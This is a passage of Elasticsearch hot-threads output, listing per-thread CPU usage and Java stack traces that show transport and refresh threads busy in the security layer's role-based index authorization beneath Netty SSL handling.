       io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1518)
       io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1267)
       io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1314)
       io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501)
       io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
       io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163)
       io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714)
       io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615)
       io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578)
       io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493)
       io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
       io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
       java.base@15/java.lang.Thread.run(Thread.java:832)
    0.9% (4.7ms out of 500ms) cpu usage by thread 'elasticsearch[d592dd1cbcb53b0ebb1f25e4ad18e487d592dd1][transport_worker][T#9]'
     unique snapshot
       java.base@15/java.util.HashMap.putVal(HashMap.java:640)
       java.base@15/java.util.HashMap.put(HashMap.java:612)
       java.base@15/java.util.HashSet.add(HashSet.java:221)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizedIndicesFromRole(RBACEngine.java:522)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5057/0x00000008018004b8.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5058/0x00000008018006e0.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5061/0x0000000801800d78.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4825/0x00000008017d0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4827/0x00000008017d04a0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.lambda$inbound$1(ServerTransportFilter.java:129)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile$$Lambda$4721/0x0000000801604bd8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4723/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4724/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:173)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.inbound(ServerTransportFilter.java:120)
       org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler.messageReceived(SecurityServerTransportInterceptor.java:313)
       app//org.elasticsearch.transport.RequestHandlerRegistry.processMessageReceived(RequestHandlerRegistry.java:72)
       app//org.elasticsearch.transport.InboundHandler$RequestHandler.doRun(InboundHandler.java:263)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.transport.InboundHandler.handleRequest(InboundHandler.java:176)
       app//org.elasticsearch.transport.InboundHandler.messageReceived(InboundHandler.java:93)
       app//org.elasticsearch.transport.InboundHandler.inboundMessage(InboundHandler.java:78)
       app//org.elasticsearch.transport.TcpTransport.inboundMessage(TcpTransport.java:692)
       org.elasticsearch.transport.netty4.Netty4MessageChannelHandler$$Lambda$4590/0x00000008016ccf08.accept(Unknown Source)
       app//org.elasticsearch.transport.InboundPipeline.forwardFragments(InboundPipeline.java:142)
       app//org.elasticsearch.transport.InboundPipeline.doHandleBytes(InboundPipeline.java:117)
       app//org.elasticsearch.transport.InboundPipeline.handleBytes(InboundPipeline.java:82)
       org.elasticsearch.transport.netty4.Netty4MessageChannelHandler.channelRead(Netty4MessageChannelHandler.java:76)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.logging.LoggingHandler.channelRead(LoggingHandler.java:271)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1518)
       io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1267)
       io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1314)
       io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501)
       io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
       io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163)
       io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714)
       io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615)
       io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578)
       io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493)
       io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
       io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
       java.base@15/java.lang.Thread.run(Thread.java:832)

    0.8% (4.1ms out of 500ms) cpu usage by thread 'elasticsearch[cc950e481f89309489e873b276c2c2cccc950e4][refresh][T#1]'
     2/10 snapshots sharing following 45 elements
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4922/0x00000008017e5180.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4923/0x00000008017e53a8.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4926/0x00000008017e5a40.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4811/0x0000000801616318.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4813/0x0000000801616778.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.lambda$inbound$1(ServerTransportFilter.java:129)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile$$Lambda$4767/0x0000000801614bd8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4769/0x0000000801615bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4770/0x0000000801615df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:173)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.inbound(ServerTransportFilter.java:120)
       org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler.messageReceived(SecurityServerTransportInterceptor.java:313)
       app//org.elasticsearch.transport.RequestHandlerRegistry.processMessageReceived(RequestHandlerRegistry.java:72)
       app//org.elasticsearch.transport.InboundHandler$RequestHandler.doRun(InboundHandler.java:263)
       app//org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingAbstractRunnable.doRun(ThreadContext.java:737)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       java.base@15/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)
       java.base@15/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)
       java.base@15/java.lang.Thread.run(Thread.java:832)

    1.0% (5.2ms out of 500ms) cpu usage by thread 'elasticsearch[3a425d9ef4773a678b2c5dd06e64c2163a425d9][refresh][T#3]'
     unique snapshot
       org.elasticsearch.xpack.core.security.authz.permission.IndicesPermission$Group$$Lambda$5029/0x0000000801803a18.test(Unknown Source)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizedIndicesFromRole(RBACEngine.java:520)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5015/0x0000000801808d88.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5016/0x0000000801808fb0.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5019/0x0000000801809648.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4793/0x0000000801606018.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4795/0x0000000801606478.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.lambda$inbound$1(ServerTransportFilter.java:129)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile$$Lambda$4740/0x0000000801604bd8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4742/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4743/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:173)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.inbound(ServerTransportFilter.java:120)
       org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler.messageReceived(SecurityServerTransportInterceptor.java:313)
       app//org.elasticsearch.transport.RequestHandlerRegistry.processMessageReceived(RequestHandlerRegistry.java:72)
       app//org.elasticsearch.transport.TransportService$8.doRun(TransportService.java:800)
       app//org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingAbstractRunnable.doRun(ThreadContext.java:737)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       java.base@15/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)
       java.base@15/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)
       java.base@15/java.lang.Thread.run(Thread.java:832)


    1.8% (8.9ms out of 500ms) cpu usage by thread 'elasticsearch[9ab0690fa220327780448edb393c88829ab0690][transport_worker][T#14]'
     unique snapshot
       org.elasticsearch.xpack.core.security.authz.permission.IndicesPermission$Group.lambda$buildIndexMatcherPredicateForAction$0(IndicesPermission.java:453)
       org.elasticsearch.xpack.core.security.authz.permission.IndicesPermission$Group$$Lambda$5094/0x00000008017e1710.test(Unknown Source)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizedIndicesFromRole(RBACEngine.java:520)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5080/0x00000008018004b8.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5081/0x00000008018006e0.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5084/0x0000000801800d78.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4786/0x0000000801606318.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4788/0x0000000801606778.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.lambda$inbound$1(ServerTransportFilter.java:129)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile$$Lambda$4733/0x0000000801604bd8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4735/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4736/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:173)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.inbound(ServerTransportFilter.java:120)
       org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler.messageReceived(SecurityServerTransportInterceptor.java:313)
       app//org.elasticsearch.transport.RequestHandlerRegistry.processMessageReceived(RequestHandlerRegistry.java:72)
       app//org.elasticsearch.transport.InboundHandler$RequestHandler.doRun(InboundHandler.java:263)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.transport.InboundHandler.handleRequest(InboundHandler.java:176)
       app//org.elasticsearch.transport.InboundHandler.messageReceived(InboundHandler.java:93)
       app//org.elasticsearch.transport.InboundHandler.inboundMessage(InboundHandler.java:78)
       app//org.elasticsearch.transport.TcpTransport.inboundMessage(TcpTransport.java:692)
       org.elasticsearch.transport.netty4.Netty4MessageChannelHandler$$Lambda$4580/0x00000008016c4e40.accept(Unknown Source)
       app//org.elasticsearch.transport.InboundPipeline.forwardFragments(InboundPipeline.java:142)
       app//org.elasticsearch.transport.InboundPipeline.doHandleBytes(InboundPipeline.java:117)
       app//org.elasticsearch.transport.InboundPipeline.handleBytes(InboundPipeline.java:82)
       org.elasticsearch.transport.netty4.Netty4MessageChannelHandler.channelRead(Netty4MessageChannelHandler.java:76)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.logging.LoggingHandler.channelRead(LoggingHandler.java:271)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1518)
       io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1267)
       io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1314)
       io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501)
       io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
       io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163)
       io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714)
       io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615)
       io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578)
       io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493)
       io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
       io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
       java.base@15/java.lang.Thread.run(Thread.java:832)

    1.1% (5.4ms out of 500ms) cpu usage by thread 'elasticsearch[e9d0f03b342338bbbb66275b3db57be5e9d0f03][refresh][T#7]'
     unique snapshot
       java.base@15/java.util.HashMap.resize(HashMap.java:735)
       java.base@15/java.util.HashMap.putVal(HashMap.java:663)
       java.base@15/java.util.HashMap.put(HashMap.java:612)
       java.base@15/java.util.HashSet.add(HashSet.java:221)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizedIndicesFromRole(RBACEngine.java:522)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5051/0x000000080180b0b8.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5052/0x000000080180b2e0.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5055/0x000000080180b978.accept(Unknown Source)
